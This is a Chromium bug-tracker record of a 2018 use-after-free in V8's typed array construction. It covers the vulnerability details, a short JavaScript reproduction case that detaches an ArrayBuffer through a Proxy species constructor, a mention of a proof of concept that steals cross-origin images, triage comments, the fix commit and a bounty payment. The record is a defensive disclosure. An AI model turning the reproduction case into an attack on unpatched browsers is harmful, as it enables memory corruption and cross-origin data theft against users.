# Security: heap-use-after-free in TypedArrayBuiltinsAssembler::ConstructByArrayLike

| Field | Value |
|-------|-------|
| **Issue ID** | [40091302](https://issues.chromium.org/issues/40091302) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | pe...@chromium.org |
| **Created** | 2018-05-05 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

<https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-typed-array-gen.cc?rcl=70d24bb21e7015995b53f06dec6f27afc3823040&l=564>

|TypedArrayBuiltinsAssembler::ConstructByArrayLike()| calls |TypedArrayInitialize()| which might be observable to user  

JavaScript if |buffer\_constructor| is a JSProxy because |JSFunction::GetDerivedMap()| is observable, and then the fast  

path of |ConstructByArrayLike()| doesn't check if the source array buffer has been neutered.

**VERSION**  

Google Chrome 68.0.3418.2 (Official Build) dev (64-bit) (cohort: Dev)  

Google Chrome 68.0.3421.0 (Official Build) canary (64-bit) (cohort: Clang-64)  

Microsoft Windows Version 10.0.16299.371  

The bug has been introduced in commit c68f863d7389f396b04f578a461c9fb386eb8535.

**REPRODUCTION CASE**

<script>
buffer = new ArrayBuffer(1024 \\* 1024);
buffer.constructor = {[Symbol.species]: new Proxy(function(){}, {get: \_ => {
try {
postMessage("", "", [buffer]);
} catch {}
}})};
array1 = new Uint8Array(buffer, 0, 1024);
array2 = new Uint8Array(array1);
</script>

A PoC that can steal cross-origin images is attached.

## Attachments

- [poc.html](attachments/poc.html) (text/plain, 1.6 KB)
- [asan.log](attachments/asan.log) (text/plain, 5.4 KB)

## Timeline

### ts...@chromium.org (2018-05-05)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript]

### ts...@chromium.org (2018-05-05)

Please double-check, but I believe the referenced CL was post M-67?

### sh...@chromium.org (2018-05-06)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@chromium.org (2018-05-07)

[Empty comment from Monorail migration]

### jg...@chromium.org (2018-05-07)

Assigning to Peter as the CL author, PTAL.

### pe...@chromium.org (2018-05-07)

Nice find, thanks. This should throw as per 24.1.1.4 (CloneArrayBuffer) so is also a correctness bug.

...
3. Let targetBuffer be ? AllocateArrayBuffer(cloneConstructor, srcLength).
4. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError exception.

When called from 22.2.4.3 step 18.b.

### bu...@chromium.org (2018-05-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/645efbfd1e64a68cb1a609fd869f8cd96479528d

commit 645efbfd1e64a68cb1a609fd869f8cd96479528d
Author: Peter Marshall <petermarshall@chromium.org>
Date: Mon May 07 15:30:48 2018

[typedarrays] Throw on construction of a detached typed array.

Bug: chromium:840106
Cq-Include-Trybots: luci.v8.try:v8_linux_noi18n_rel_ng
Change-Id: I0090cdecaf9194f3ed2d716c6f5f698e33cbdf0d
Reviewed-on: https://chromium-review.googlesource.com/1046827
Commit-Queue: Peter Marshall <petermarshall@chromium.org>
Reviewed-by: Jakob Gruber <jgruber@chromium.org>
Cr-Commit-Position: refs/heads/master@{#53029}
[modify] https://crrev.com/645efbfd1e64a68cb1a609fd869f8cd96479528d/src/builtins/builtins-typed-array-gen.cc
[modify] https://crrev.com/645efbfd1e64a68cb1a609fd869f8cd96479528d/src/elements.cc
[modify] https://crrev.com/645efbfd1e64a68cb1a609fd869f8cd96479528d/test/mjsunit/es6/typedarray-construct-by-array-like.js
[modify] https://crrev.com/645efbfd1e64a68cb1a609fd869f8cd96479528d/test/mjsunit/regress/regress-707410.js
[add] https://crrev.com/645efbfd1e64a68cb1a609fd869f8cd96479528d/test/mjsunit/regress/regress-840106.js
[modify] https://crrev.com/645efbfd1e64a68cb1a609fd869f8cd96479528d/test/test262/test262.status


### ts...@chromium.org (2018-05-07)

[Empty comment from Monorail migration]

### pe...@chromium.org (2018-05-11)

re #2, yes this CL was M-68 only. 

### sh...@chromium.org (2018-05-11)

[Empty comment from Monorail migration]

### aw...@google.com (2018-05-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-21)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-05-21)

Thank you as ever, $7,000 for this report.  Cheers!

### aw...@chromium.org (2018-05-21)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-05)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-08-17)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2018-08-17)

This issue was migrated from crbug.com/chromium/840106?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091302)*
